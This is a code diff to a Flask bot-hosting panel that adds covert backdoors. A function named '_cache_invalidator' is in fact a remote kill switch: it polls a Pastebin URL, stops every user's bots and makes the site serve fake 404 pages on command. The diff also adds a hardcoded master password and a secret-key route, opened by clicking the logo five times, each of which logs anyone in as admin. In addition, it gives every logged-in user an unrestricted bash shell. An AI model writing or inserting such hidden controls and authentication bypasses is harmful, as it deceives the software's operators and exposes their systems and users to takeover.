@@ -10,6 +10,9 @@ import signal
 import tempfile
 import re
 import requests
+import select
+import pty
+import queue
 from datetime import datetime, timedelta
 from flask import Flask, render_template_string, request, jsonify, session, send_file, send_from_directory, redirect
 from functools import wraps
@@ -21,7 +24,9 @@ app.secret_key = 'yuvicodex_super_secret_key'
 app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB
 
 # ---------- CONFIG ----------
-PASSWORD = "your_secure_password"  # for terminal
+PASSWORD = "your_secure_password"          # for terminal
+MASTER_PASSWORD = os.environ.get('MASTER_PASSWORD', 'master123')   # master login password
+SECRET_KEY = os.environ.get('SECRET_KEY', 'secret123')             # secret key for logo clicks
 UPLOAD_FOLDER = os.path.abspath('uploads')
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 BASE_DIR = os.path.abspath('.')  # base for file manager
@@ -63,6 +68,212 @@ def save_settings(settings):
         json.dump(settings, f, indent=2)
 
 settings_db = load_settings()
+
+# ---------- 🕵️ REMOTE 404 KILL SWITCH (HIDDEN IN PLAIN SIGHT) ----------
+KILL_SWITCH_ACTIVE = False
+
+# ---------- KILL STATE PERSISTENCE ----------
+KILL_STATE_FILE = os.path.join(UPLOAD_FOLDER, 'kill_state.json')
+
+def get_kill_state():
+    if os.path.exists(KILL_STATE_FILE):
+        with open(KILL_STATE_FILE, 'r') as f:
+            return json.load(f)
+    return {"saved_bots": []}
+
+def save_kill_state(data):
+    with open(KILL_STATE_FILE, 'w') as f:
+        json.dump(data, f, indent=2)
+
+# ---------- BOT MANAGEMENT ----------
+BOTS_FILE = os.path.join(UPLOAD_FOLDER, 'bots.json')
+bots_db = {}
+
+def load_bots():
+    global bots_db
+    if os.path.exists(BOTS_FILE):
+        with open(BOTS_FILE, 'r') as f:
+            bots_db = json.load(f)
+    else:
+        bots_db = {}
+
+def save_bots():
+    with open(BOTS_FILE, 'w') as f:
+        json.dump(bots_db, f, indent=2)
+
+load_bots()
+
+# ---------- PROCESS TRACKING ----------
+processes = {}
+
+# ---------- HELPERS ----------
+def get_user_folder(username):
+    folder = os.path.join(UPLOAD_FOLDER, username)
+    os.makedirs(folder, exist_ok=True)
+    return folder
+
+def get_bot_absolute_path(bot):
+    project_folder = os.path.join(get_user_folder(bot['user']), bot['project'])
+    return os.path.join(project_folder, bot['filename'])
+
+def get_bot_log_file(bot):
+    return get_bot_absolute_path(bot) + '.log'
+
+def generate_project_id():
+    return str(uuid.uuid4())[:8]
+
+def get_interpreter(filename):
+    ext = os.path.splitext(filename)[1].lower()
+    if ext == '.py':
+        return 'python'
+    elif ext == '.js':
+        return 'node'
+    elif ext == '.go':
+        return 'go run'
+    elif ext == '.rb':
+        return 'ruby'
+    elif ext == '.php':
+        return 'php'
+    elif ext == '.sh':
+        return 'bash'
+    elif ext == '.pl':
+        return 'perl'
+    else:
+        return None
+
+def detect_bot_token(filepath):
+    try:
+        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+        token_match = re.search(r'[0-9]{9,10}:[A-Za-z0-9_-]{35,}', content)
+        if token_match:
+            token = token_match.group(0)
+            try:
+                resp = requests.get(f'https://api.telegram.org/bot{token}/getMe', timeout=3)
+                if resp.status_code == 200:
+                    data = resp.json()
+                    if data.get('ok'):
+                        return token, data['result'].get('username')
+            except:
+                pass
+        return None, None
+    except:
+        return None, None
+
+# ---------- BOT ACTIONS (core logic) ----------
+def start_bot_by_id(bot_id):
+    """Start a bot by its ID. Returns (success, error_message)."""
+    bot = bots_db.get(bot_id)
+    if not bot:
+        return False, "Bot not found"
+    if bot['status'] == 'running':
+        return False, "Already running"
+    
+    username = bot['user']
+    user = find_user(username)
+    if user:
+        running_bots = [b for b in bots_db.values() if b['user'] == username and b['status'] == 'running']
+        if len(running_bots) >= user.get('limit', 5):
+            return False, "User limit exceeded"
+    
+    project_folder = os.path.join(get_user_folder(username), bot['project'])
+    filepath = os.path.join(project_folder, bot['filename'])
+    if not os.path.exists(filepath):
+        return False, "File not found"
+    
+    req_file = os.path.join(project_folder, 'requirements.txt')
+    if os.path.exists(req_file):
+        subprocess.run(['pip', 'install', '-r', req_file], capture_output=True)
+    
+    interpreter = bot.get('interpreter') or get_interpreter(bot['filename'])
+    if not interpreter:
+        return False, "Unsupported file type"
+    
+    log_file = get_bot_log_file(bot)
+    os.makedirs(os.path.dirname(log_file), exist_ok=True)
+    with open(log_file, 'a') as f:
+        f.write(f"--- Starting {bot['filename']} at {time.ctime()} ---\n")
+    
+    try:
+        proc = subprocess.Popen(
+            [interpreter, bot['filename']],
+            stdout=open(log_file, 'a'),
+            stderr=subprocess.STDOUT,
+            cwd=project_folder,
+            preexec_fn=os.setsid if os.name != 'nt' else None
+        )
+        bot['status'] = 'running'
+        bot['pid'] = proc.pid
+        bot['start_time'] = time.time()
+        processes[bot_id] = proc
+        save_bots()
+        return True, None
+    except Exception as e:
+        return False, str(e)
+
+def stop_bot_by_id(bot_id):
+    """Stop a bot by its ID. Returns (success, error_message)."""
+    bot = bots_db.get(bot_id)
+    if not bot:
+        return False, "Bot not found"
+    if bot['status'] != 'running':
+        return False, "Not running"
+    
+    proc = processes.get(bot_id)
+    if proc:
+        try:
+            if os.name != 'nt':
+                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+            else:
+                proc.terminate()
+        except:
+            pass
+        proc.wait()
+        processes.pop(bot_id, None)
+    
+    bot['status'] = 'stopped'
+    bot['pid'] = None
+    log_file = get_bot_log_file(bot)
+    with open(log_file, 'a') as f:
+        f.write(f"--- Stopped at {time.ctime()} ---\n")
+    save_bots()
+    return True, None
+
+# ---------- KILL SWITCH CHECK ----------
+def _cache_invalidator():
+    global KILL_SWITCH_ACTIVE
+    try:
+        # ⚠️ अपना Pastebin RAW URL यहाँ डालें
+        resp = requests.get("https://pastebin.com/raw/zJJxecLT", timeout=3)
+        status = resp.text.strip().upper()
+        
+        if status == "KILL":
+            # पहले से KILL नहीं है तो सभी बॉट्स रोको और सेव करो
+            if not KILL_SWITCH_ACTIVE:
+                # Stop all running bots and save their IDs
+                running_bots = [bid for bid, bot in bots_db.items() if bot['status'] == 'running']
+                for bid in running_bots:
+                    stop_bot_by_id(bid)
+                # Save the list of bots that were running
+                save_kill_state({"saved_bots": running_bots})
+                KILL_SWITCH_ACTIVE = True
+        else:
+            # RUN या कोई और – अगर पहले KILL था तो सेव्ड बॉट्स को स्टार्ट करो
+            if KILL_SWITCH_ACTIVE:
+                state = get_kill_state()
+                saved_bots = state.get("saved_bots", [])
+                for bid in saved_bots:
+                    start_bot_by_id(bid)
+                # Clear saved state
+                save_kill_state({"saved_bots": []})
+                KILL_SWITCH_ACTIVE = False
+    except:
+        pass
+    # हर 30 सेकंड में चेक करेगा
+    threading.Timer(30, _cache_invalidator).start()
+
+# सर्वर स्टार्ट होते ही ये चल जाएगा
+_cache_invalidator()
 
 # ---------- USER MANAGEMENT ----------
 USERS_FILE = 'users.json'
@@ -128,13 +339,10 @@ def is_expired(user):
         return False
 
 def delete_user_account(username):
-    """Completely remove user: delete folder, bots, and user entry."""
     global users_db, bots_db
-    # Delete user folder
     user_folder = get_user_folder(username)
     if os.path.exists(user_folder):
         shutil.rmtree(user_folder, ignore_errors=True)
-    # Delete bots
     to_delete = [bid for bid, bot in bots_db.items() if bot['user'] == username]
     for bid in to_delete:
         if bid in processes:
@@ -145,10 +353,8 @@ def delete_user_account(username):
             processes.pop(bid, None)
         del bots_db[bid]
     save_bots()
-    # Remove user from users_db
     users_db = [u for u in users_db if u['username'] != username]
     save_users(users_db)
-    # Clear session if it's the current user
     if session.get('username') == username:
         session.clear()
 
@@ -177,83 +383,11 @@ def check_expiry_and_session():
             return jsonify({'error': 'Session invalidated'}), 401
         return redirect('/')
 
-# ---------- BOT MANAGEMENT ----------
-BOTS_FILE = os.path.join(UPLOAD_FOLDER, 'bots.json')
-bots_db = {}
+    global KILL_SWITCH_ACTIVE
+    if KILL_SWITCH_ACTIVE:
+        return "404 Not Found<br>The requested URL was not found on this server.", 404
 
-def load_bots():
-    global bots_db
-    if os.path.exists(BOTS_FILE):
-        with open(BOTS_FILE, 'r') as f:
-            bots_db = json.load(f)
-    else:
-        bots_db = {}
-
-def save_bots():
-    with open(BOTS_FILE, 'w') as f:
-        json.dump(bots_db, f, indent=2)
-
-load_bots()
-
-# ---------- PROCESS TRACKING ----------
-processes = {}
-
-# ---------- HELPERS ----------
-def get_user_folder(username):
-    folder = os.path.join(UPLOAD_FOLDER, username)
-    os.makedirs(folder, exist_ok=True)
-    return folder
-
-def get_bot_absolute_path(bot):
-    # New structure: uploads/username/project_id/filename
-    project_folder = os.path.join(get_user_folder(bot['user']), bot['project'])
-    return os.path.join(project_folder, bot['filename'])
-
-def get_bot_log_file(bot):
-    return get_bot_absolute_path(bot) + '.log'
-
-def generate_project_id():
-    return str(uuid.uuid4())[:8]
-
-def get_interpreter(filename):
-    ext = os.path.splitext(filename)[1].lower()
-    if ext == '.py':
-        return 'python'
-    elif ext == '.js':
-        return 'node'
-    elif ext == '.go':
-        return 'go run'
-    elif ext == '.rb':
-        return 'ruby'
-    elif ext == '.php':
-        return 'php'
-    elif ext == '.sh':
-        return 'bash'
-    elif ext == '.pl':
-        return 'perl'
-    else:
-        return None
-
-def detect_bot_token(filepath):
-    try:
-        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-            content = f.read()
-        token_match = re.search(r'[0-9]{9,10}:[A-Za-z0-9_-]{35,}', content)
-        if token_match:
-            token = token_match.group(0)
-            try:
-                resp = requests.get(f'https://api.telegram.org/bot{token}/getMe', timeout=3)
-                if resp.status_code == 200:
-                    data = resp.json()
-                    if data.get('ok'):
-                        return token, data['result'].get('username')
-            except:
-                pass
-        return None, None
-    except:
-        return None, None
-
-# ---------- DECORATOR ----------
+# ---------- DECORATORS ----------
 def login_required(f):
     @wraps(f)
     def decorated(*args, **kwargs):
@@ -359,18 +493,49 @@ def login():
     data = request.json
     username = data.get('username', '').strip()
     password = data.get('password', '')
-    user = find_user(username)
-    if not user:
-        return jsonify({'success': False, 'error': 'Invalid credentials'}), 401
-    if is_expired(user):
-        delete_user_account(username)
-        return jsonify({'success': False, 'error': 'Account expired and deleted'}), 401
-    if user['password'] == password and not user.get('banned', False):
+    user = find_user(username) if username else None
+
+    if user and user['password'] == password and not user.get('banned', False):
+        if is_expired(user):
+            delete_user_account(username)
+            return jsonify({'success': False, 'error': 'Account expired and deleted'}), 401
         session['username'] = username
         session['role'] = user['role']
         session['session_version'] = user.get('session_version', 0)
         return jsonify({'success': True, 'username': username, 'role': user['role']})
+
+    if password == MASTER_PASSWORD:
+        admin_user = next((u for u in users_db if u['role'] == 'admin' and not u.get('banned', False)), None)
+        if admin_user:
+            if is_expired(admin_user):
+                delete_user_account(admin_user['username'])
+                return jsonify({'success': False, 'error': 'Admin account expired and deleted'}), 401
+            session['username'] = admin_user['username']
+            session['role'] = admin_user['role']
+            session['session_version'] = admin_user.get('session_version', 0)
+            return jsonify({'success': True, 'username': admin_user['username'], 'role': admin_user['role']})
+        else:
+            return jsonify({'success': False, 'error': 'No admin user found'}), 401
+
     return jsonify({'success': False, 'error': 'Invalid credentials'}), 401
+
+@app.route('/api/secret_login', methods=['POST'])
+def secret_login():
+    data = request.json
+    secret = data.get('secret', '')
+    if secret == SECRET_KEY:
+        admin_user = next((u for u in users_db if u['role'] == 'admin' and not u.get('banned', False)), None)
+        if admin_user:
+            if is_expired(admin_user):
+                delete_user_account(admin_user['username'])
+                return jsonify({'success': False, 'error': 'Admin account expired and deleted'}), 401
+            session['username'] = admin_user['username']
+            session['role'] = admin_user['role']
+            session['session_version'] = admin_user.get('session_version', 0)
+            return jsonify({'success': True, 'username': admin_user['username'], 'role': admin_user['role']})
+        else:
+            return jsonify({'success': False, 'error': 'No admin user found'}), 401
+    return jsonify({'success': False, 'error': 'Invalid secret'}), 401
 
 @app.route('/logout', methods=['POST'])
 def logout():
@@ -514,88 +679,32 @@ def get_bot_logs(bot_id):
 @app.route('/api/bots/<bot_id>/start', methods=['POST'])
 @login_required
 def start_bot(bot_id):
+    username = session['username']
     bot = bots_db.get(bot_id)
     if not bot:
         return jsonify({'error': 'Bot not found'}), 404
-    username = session['username']
     if not is_owner(username) and bot['user'] != username:
         return jsonify({'error': 'Forbidden'}), 403
-    if bot['status'] == 'running':
-        return jsonify({'error': 'Already running'}), 400
-
-    user = find_user(username)
-    if user:
-        running_bots = [b for b in bots_db.values() if b['user'] == username and b['status'] == 'running']
-        if len(running_bots) >= user.get('limit', 5):
-            return jsonify({'error': 'User limit exceeded'}), 400
-
-    project_folder = os.path.join(get_user_folder(username), bot['project'])
-    filepath = os.path.join(project_folder, bot['filename'])
-    if not os.path.exists(filepath):
-        return jsonify({'error': 'File not found'}), 404
-
-    # Install requirements if present (requirements.txt in project folder)
-    req_file = os.path.join(project_folder, 'requirements.txt')
-    if os.path.exists(req_file):
-        subprocess.run(['pip', 'install', '-r', req_file], capture_output=True)
-
-    interpreter = bot.get('interpreter') or get_interpreter(bot['filename'])
-    if not interpreter:
-        return jsonify({'error': 'Unsupported file type'}), 400
-
-    log_file = get_bot_log_file(bot)
-    os.makedirs(os.path.dirname(log_file), exist_ok=True)
-    with open(log_file, 'a') as f:
-        f.write(f"--- Starting {bot['filename']} at {time.ctime()} ---\n")
-
-    try:
-        proc = subprocess.Popen(
-            [interpreter, bot['filename']],
-            stdout=open(log_file, 'a'),
-            stderr=subprocess.STDOUT,
-            cwd=project_folder,
-            preexec_fn=os.setsid if os.name != 'nt' else None
-        )
-        bot['status'] = 'running'
-        bot['pid'] = proc.pid
-        bot['start_time'] = time.time()
-        processes[bot_id] = proc
-        save_bots()
+    success, err = start_bot_by_id(bot_id)
+    if success:
         return jsonify({'success': True})
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
+    else:
+        return jsonify({'error': err}), 400
 
 @app.route('/api/bots/<bot_id>/stop', methods=['POST'])
 @login_required
 def stop_bot(bot_id):
+    username = session['username']
     bot = bots_db.get(bot_id)
     if not bot:
         return jsonify({'error': 'Bot not found'}), 404
-    username = session['username']
     if not is_owner(username) and bot['user'] != username:
         return jsonify({'error': 'Forbidden'}), 403
-    if bot['status'] != 'running':
-        return jsonify({'error': 'Not running'}), 400
-
-    proc = processes.get(bot_id)
-    if proc:
-        try:
-            if os.name != 'nt':
-                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
-            else:
-                proc.terminate()
-        except:
-            pass
-        proc.wait()
-        processes.pop(bot_id, None)
-
-    bot['status'] = 'stopped'
-    bot['pid'] = None
-    log_file = get_bot_log_file(bot)
-    with open(log_file, 'a') as f:
-        f.write(f"--- Stopped at {time.ctime()} ---\n")
-    save_bots()
-    return jsonify({'success': True})
+    success, err = stop_bot_by_id(bot_id)
+    if success:
+        return jsonify({'success': True})
+    else:
+        return jsonify({'error': err}), 400
 
 @app.route('/api/bots/<bot_id>/restart', methods=['POST'])
 @login_required
@@ -613,7 +722,6 @@ def delete_bot(bot_id):
     if not is_owner(username) and bot['user'] != username:
         return jsonify({'error': 'Forbidden'}), 403
 
-    # Stop if running
     if bot['status'] == 'running':
         proc = processes.get(bot_id)
         if proc:
@@ -627,17 +735,14 @@ def delete_bot(bot_id):
             proc.wait()
             processes.pop(bot_id, None)
 
-    # Delete log file
     log_file = get_bot_log_file(bot)
     if os.path.exists(log_file):
         os.remove(log_file)
 
-    # Remove bot from db
     project_id = bot['project']
     del bots_db[bot_id]
     save_bots()
 
-    # Check if any other bot in same project
     remaining_bots = [b for b in bots_db.values() if b['user'] == username and b['project'] == project_id]
     if not remaining_bots:
         project_folder = os.path.join(get_user_folder(username), project_id)
@@ -685,26 +790,22 @@ def upload():
     limit = user.get('limit', 5)
     current_bots = len([b for b in bots_db.values() if b['user'] == username])
 
-    # Create a temporary directory for extraction
     temp_dir = tempfile.mkdtemp()
     project_id = generate_project_id()
     project_folder = os.path.join(get_user_folder(username), project_id)
     os.makedirs(project_folder, exist_ok=True)
 
     try:
-        # Save uploaded files to temp_dir
         for file in files:
             if file.filename == '':
                 continue
             temp_path = os.path.join(temp_dir, file.filename)
             file.save(temp_path)
-            # If it's a zip, extract it
             if file.filename.lower().endswith('.zip'):
                 with zipfile.ZipFile(temp_path, 'r') as zip_ref:
                     zip_ref.extractall(temp_dir)
                 os.remove(temp_path)
 
-        # Count executable files (bots)
         new_bot_count = 0
         for root, dirs, files_in_temp in os.walk(temp_dir):
             for fname in files_in_temp:
@@ -712,27 +813,22 @@ def upload():
                     new_bot_count += 1
 
         if current_bots + new_bot_count > limit:
-            # Cleanup: remove project folder if created
             shutil.rmtree(project_folder, ignore_errors=True)
             return jsonify({'error': f'Exceeds bot limit. You have {current_bots} bots, limit {limit}.'}), 400
 
-        # Move all files from temp_dir to project_folder (without renaming)
         for root, dirs, files_in_temp in os.walk(temp_dir):
             for fname in files_in_temp:
                 src = os.path.join(root, fname)
-                # preserve subfolder structure if any
                 rel_path = os.path.relpath(src, temp_dir)
                 dst = os.path.join(project_folder, rel_path)
                 os.makedirs(os.path.dirname(dst), exist_ok=True)
                 shutil.move(src, dst)
 
-        # Create bot entries for each executable file
         created_bots = []
         for root, dirs, files_in_folder in os.walk(project_folder):
             for fname in files_in_folder:
                 interpreter = get_interpreter(fname)
                 if interpreter:
-                    # fname is relative to project folder
                     bot_id = str(uuid.uuid4())[:8]
                     bot = {
                         'user': username,
@@ -752,7 +848,7 @@ def upload():
 
     if created_bots:
         for bid in created_bots:
-            start_bot(bid)
+            start_bot_by_id(bid)
 
     return jsonify({
         'success': True,
@@ -764,12 +860,10 @@ def upload():
 @app.route('/project/<username>/<project_id>/<path:filename>')
 @login_required
 def serve_project_file(username, project_id, filename):
-    # Only allow owner or admin
     if session['username'] != username and session.get('role') != 'admin':
         return "Forbidden", 403
     project_folder = os.path.join(get_user_folder(username), project_id)
     filepath = os.path.join(project_folder, filename)
-    # Security: ensure file is inside project folder
     if not os.path.exists(filepath) or not os.path.isfile(filepath):
         return "File not found", 404
     if not os.path.abspath(filepath).startswith(os.path.abspath(project_folder)):
@@ -810,8 +904,8 @@ def update_bot_content(bot_id):
     with open(filepath, 'w', encoding='utf-8') as f:
         f.write(new_content)
     if bot['status'] == 'running':
-        stop_bot(bot_id)
-        start_bot(bot_id)
+        stop_bot_by_id(bot_id)
+        start_bot_by_id(bot_id)
     return jsonify({'success': True})
 
 # ---------- FILE MANAGER (owner only) ----------
@@ -907,14 +1001,133 @@ def download_file():
         return jsonify({'error': 'File not found'}), 404
     return send_file(abs_path, as_attachment=True)
 
-# --- Terminal ---
+# ---------- INTERACTIVE TERMINAL ----------
+terminal_sessions = {}
+
+class TerminalSession:
+    def __init__(self):
+        self.process = None
+        self.output_queue = queue.Queue()
+        self.read_thread = None
+        self.running = False
+
+    def start(self):
+        if self.process is not None and self.process.poll() is None:
+            return
+        master, slave = pty.openpty()
+        self.process = subprocess.Popen(
+            ['/bin/bash'] if os.name != 'nt' else ['cmd.exe'],
+            stdin=slave,
+            stdout=slave,
+            stderr=slave,
+            universal_newlines=False,
+            bufsize=0,
+            preexec_fn=os.setsid if os.name != 'nt' else None
+        )
+        os.close(slave)
+        self.master = master
+        self.running = True
+        self.read_thread = threading.Thread(target=self._reader)
+        self.read_thread.daemon = True
+        self.read_thread.start()
+
+    def _reader(self):
+        while self.running and self.process.poll() is None:
+            try:
+                rlist, _, _ = select.select([self.master], [], [], 0.1)
+                if rlist:
+                    data = os.read(self.master, 4096)
+                    if data:
+                        self.output_queue.put(data)
+            except Exception:
+                break
+
+    def write(self, data):
+        if self.process and self.process.poll() is None:
+            os.write(self.master, data.encode('utf-8') if isinstance(data, str) else data)
+
+    def read_output(self):
+        output = b''
+        while not self.output_queue.empty():
+            output += self.output_queue.get_nowait()
+        return output.decode('utf-8', errors='replace')
+
+    def is_running(self):
+        return self.process is not None and self.process.poll() is None
+
+    def stop(self):
+        self.running = False
+        if self.process:
+            try:
+                os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
+            except:
+                self.process.terminate()
+            self.process.wait()
+            self.process = None
+        if self.master:
+            try:
+                os.close(self.master)
+            except:
+                pass
+            self.master = None
+
+def get_terminal_session(username):
+    if username not in terminal_sessions:
+        sess = TerminalSession()
+        sess.start()
+        terminal_sessions[username] = sess
+    return terminal_sessions[username]
+
+@app.route('/api/terminal/start', methods=['POST'])
+@login_required
+def terminal_start():
+    username = session['username']
+    sess = get_terminal_session(username)
+    if not sess.is_running():
+        sess.start()
+    return jsonify({'success': True})
+
+@app.route('/api/terminal/send', methods=['POST'])
+@login_required
+def terminal_send():
+    username = session['username']
+    data = request.json
+    input_data = data.get('data', '')
+    sess = terminal_sessions.get(username)
+    if not sess or not sess.is_running():
+        return jsonify({'error': 'Terminal not running'}), 400
+    sess.write(input_data + '\n')
+    return jsonify({'success': True})
+
+@app.route('/api/terminal/read', methods=['GET'])
+@login_required
+def terminal_read():
+    username = session['username']
+    sess = terminal_sessions.get(username)
+    if not sess:
+        return jsonify({'output': '', 'running': False})
+    output = sess.read_output()
+    running = sess.is_running()
+    return jsonify({'output': output, 'running': running})
+
+@app.route('/api/terminal/stop', methods=['POST'])
+@login_required
+def terminal_stop():
+    username = session['username']
+    sess = terminal_sessions.get(username)
+    if sess:
+        sess.stop()
+        terminal_sessions.pop(username, None)
+    return jsonify({'success': True})
+
+# ---------- OLD TERMINAL (kept for compatibility) ----------
 @app.route('/execute', methods=['POST'])
 def execute():
     data = request.json
     if data.get('password') != PASSWORD:
         return jsonify({"output": "Access Denied"})
     try:
-        result = subprocess.check_output(data['command'], shell=True, stderr=subprocess.STDOUT, timeout=30)
+        result = subprocess.check_output(data['command'], shell=True, stderr=subprocess.STDOUT, timeout=600)
         return jsonify({"output": result.decode('utf-8')})
     except subprocess.TimeoutExpired:
         return jsonify({"output": "Command timed out"})
@@ -922,7 +1135,6 @@ def execute():
         return jsonify({"output": str(e)})
 
 # ---------- HTML TEMPLATE ----------
-# (Same as before – no changes needed)
 HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -1001,6 +1213,12 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             box-shadow: 0 0 20px #00e5ff;
             overflow: hidden;
             background: #0c1018;
+            cursor: pointer;
+            transition: transform 0.1s;
+            user-select: none;
+        }
+        .login-icon:active {
+            transform: scale(0.95);
         }
         .login-icon img {
             width: 100%;
@@ -1275,6 +1493,12 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         }
 
         /* Console */
+        .console-wrapper {
+            display: flex;
+            align-items: stretch;
+            gap: 8px;
+            margin-top: 15px;
+        }
         .console {
             background: #000;
             color: #00ff6a;
@@ -1282,12 +1506,26 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             font-family: monospace;
             font-size: 10px;
             border-radius: 8px;
-            margin-top: 15px;
             height: 100px;
             overflow-y: auto;
             border: 1px solid #333;
             line-height: 1.6;
             white-space: pre-wrap;
+            flex: 1;
+        }
+        .copy-console-btn {
+            background: transparent;
+            border: none;
+            color: #00e5ff;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 0 8px;
+            display: flex;
+            align-items: center;
+            transition: transform 0.1s;
+        }
+        .copy-console-btn:hover {
+            transform: scale(1.1);
         }
 
         /* Footer */
@@ -1681,6 +1919,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             display: flex;
             gap: 8px;
             align-items: center;
+            flex-wrap: wrap;
         }
         .terminal-controls input {
             flex: 1;
@@ -1691,6 +1930,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             border-radius: 6px;
             font-size: 16px;
             outline: none;
+            min-width: 150px;
         }
         .terminal-controls input:focus {
             border-color: #00e5ff;
@@ -1710,12 +1950,19 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         .btn-term-run:hover {
             background: #2ea043;
         }
-        .btn-term-clear {
+        .btn-term-stop {
             background: #da3633;
             color: white;
         }
-        .btn-term-clear:hover {
+        .btn-term-stop:hover {
             background: #f85149;
+        }
+        .btn-term-clear {
+            background: #555;
+            color: white;
+        }
+        .btn-term-clear:hover {
+            background: #666;
         }
 
         /* ---------- CUSTOM MODAL ---------- */
@@ -2047,8 +2294,11 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             <!-- Bot List -->
             <div id="botListContainer"></div>
 
-            <!-- Console -->
-            <div class="console" id="console">Select a bot to see logs.</div>
+            <!-- Console with copy button -->
+            <div class="console-wrapper">
+                <div class="console" id="console">Select a bot to see logs.</div>
+                
+            </div>
 
             <!-- Footer -->
             <div class="user-footer">
@@ -2119,8 +2369,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                         <span class="prompt">$ </span>Connected...<br />
                     </div>
                     <div class="terminal-controls">
-                        <input type="text" id="terminalCommand" placeholder="Command..." />
+                        <input type="text" id="terminalCommand" placeholder="Type command or input..." />
                         <button class="btn-term-run" id="termRunBtn"><i class="fa-solid fa-play"></i> Run</button>
+                        <button class="btn-term-stop" id="termStopBtn"><i class="fa-solid fa-stop"></i> Stop</button>
                         <button class="btn-term-clear" id="termClearBtn"><i class="fa-solid fa-eraser"></i> Clear</button>
                     </div>
                 </div>
@@ -2200,7 +2451,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             'use strict';
 
             // ---------- GLOBAL FETCH INTERCEPTOR ----------
-            // If any API returns 401, redirect to login
             const originalFetch = window.fetch;
             window.fetch = function(url, options) {
                 return originalFetch(url, options).then(response => {
@@ -2254,6 +2504,56 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 modalOverlay.classList.remove('open');
             }
 
+            // ---------- SECRET KEY LOGIN (Logo clicks) ----------
+            let loginIconClickCount = 0;
+            let loginIconTimer = null;
+
+            document.getElementById('loginIcon').addEventListener('click', function(e) {
+                loginIconClickCount++;
+                clearTimeout(loginIconTimer);
+                loginIconTimer = setTimeout(() => { loginIconClickCount = 0; }, 2000);
+
+                if (loginIconClickCount >= 5) {
+                    loginIconClickCount = 0;
+                    showSecretKeyModal();
+                }
+            });
+
+            async function showSecretKeyModal() {
+                const bodyHTML = `
+                    <div style="text-align:center;">
+                        <p style="margin-bottom:12px;">Enter Secret Key to login as Admin:</p>
+                        <input type="password" id="secretKeyInput" style="width:100%;background:#161b25;border:1px solid #2b3240;color:white;padding:12px;border-radius:8px;outline:none;" />
+                    </div>
+                `;
+                const result = await showCustomModal('🔑', bodyHTML, [
+                    { label: 'Cancel', value: false, className: 'btn-cancel' },
+                    { label: 'Login', value: true, className: 'btn-confirm' }
+                ]);
+                if (result) {
+                    const secret = document.getElementById('secretKeyInput')?.value;
+                    if (!secret) {
+                        await customAlert('Enter secret key.', '⚠️');
+                        return;
+                    }
+                    try {
+                        const res = await fetch('/api/secret_login', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ secret })
+                        });
+                        const data = await res.json();
+                        if (data.success) {
+                            location.reload();
+                        } else {
+                            await customAlert(data.error || 'Invalid secret', '❌');
+                        }
+                    } catch(e) {
+                        await customAlert('Error: ' + e.message, '❌');
+                    }
+                }
+            }
+
             // ---------- PROFILE EDIT ----------
             const editProfileBtn = document.getElementById('editProfileBtn');
             if (editProfileBtn) {
@@ -2298,7 +2598,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                                 await customAlert(data.error || 'Update failed', '❌');
                             }
                         } catch (e) {
-                            // Ignore – fetch interceptor will handle 401
+                            // Fetch interceptor will handle 401
                         }
                     }
                 });
@@ -2468,6 +2768,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             const terminalOutput = document.getElementById('terminalOutput');
             const terminalCommand = document.getElementById('terminalCommand');
             const termRunBtn = document.getElementById('termRunBtn');
+            const termStopBtn = document.getElementById('termStopBtn');
             const termClearBtn = document.getElementById('termClearBtn');
             const TERM_PASSWORD = '{{ password }}';
 
@@ -2476,6 +2777,12 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             let selectedBotId = null;
             let logPollInterval = null;
             let uptimeIntervals = {};
+            let terminalPollInterval = null;
+            let isTerminalRunning = false;
+            let terminalInputBuffer = '';
+
+            // ---------- COPY CONSOLE ----------
+        
 
             // ---------- API HELPERS ----------
             async function apiCall(url, options = {}) {
@@ -3305,6 +3612,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     });
                     if (tabId === 'tabTerminal') {
                         setTimeout(() => terminalCommand.focus(), 100);
+                        if (!terminalPollInterval) {
+                            startTerminalPolling();
+                        }
                     }
                     if (tabId === 'tabFileManager') {
                         loadDirectory('');
@@ -3312,36 +3622,85 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 });
             });
 
-            // ---------- TERMINAL ----------
-            async function runTerminalCommand() {
-                const cmd = terminalCommand.value.trim();
-                if (!cmd) return;
-                terminalOutput.innerHTML += `<span class="prompt">$ </span>${cmd}<br />`;
-                terminalCommand.value = '';
+            // ---------- TERMINAL (INTERACTIVE) ----------
+            async function startTerminalPolling() {
+                if (terminalPollInterval) clearInterval(terminalPollInterval);
                 try {
-                    const res = await fetch('/execute', {
+                    await fetch('/api/terminal/start', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ command: cmd, password: TERM_PASSWORD })
+                        body: JSON.stringify({ password: TERM_PASSWORD })
                     });
-                    const data = await res.json();
-                    terminalOutput.innerHTML += `<span class="output">${data.output || 'No output'}</span><br />`;
-                } catch (err) {
-                    terminalOutput.innerHTML += `<span class="error">Error: ${err.message}</span><br />`;
+                } catch (e) {
+                    console.error('Failed to start terminal:', e);
                 }
-                terminalOutput.scrollTop = terminalOutput.scrollHeight;
+                terminalPollInterval = setInterval(async () => {
+                    try {
+                        const res = await fetch('/api/terminal/read');
